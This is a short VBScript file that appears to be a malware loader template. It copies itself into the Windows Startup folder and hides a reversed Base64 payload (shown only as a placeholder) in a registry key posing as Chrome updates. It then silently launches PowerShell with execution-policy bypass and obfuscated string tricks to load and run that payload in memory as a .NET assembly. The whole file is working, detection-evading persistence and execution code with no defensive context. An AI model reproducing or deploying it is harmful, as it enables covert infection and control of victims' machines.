On Error Resume Next
For x = 0 To 5
     WScript.Sleep(1000)
   Next

Alpha ="Reverse Base64 String Here"

Set obj = CreateObject("Wscript.Shell")
Set fso=CreateObject("Scripting.FileSystemObject")

 startPath = obj.SpecialFolders("Startup") & "\Startup.vbs"
 currentPath = fso.GetAbsolutePathName(wscript.scriptfullname)
R3g = "HKCU\SOFTWARE\Chrome\Updates"

if obj.RegRead(R3g ) <> Alpha then
obj.RegWrite R3g, Alpha
end if

Soon = "powershell -noexit -exec bypass -window 1 -Command Copy-Item '" & currentPath & "' '" & startPath & "'; $text = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates); $text = -join $text[-1..-$text.Length];[<##>AppDomain<##>]::<##>('*urrentDomain'.replace('*','C'))<##>.<##>('FUDoad'.replace('FUD','L'))([Convert]::FromBase64String($text))<##>.<##>('=ntryPoint'.replace('=','E'))<##>.<##>('InLOCKoke'.replace('LOCK','v'))($Null,$Null)<##>;"

obj.Run Soon, 0, False
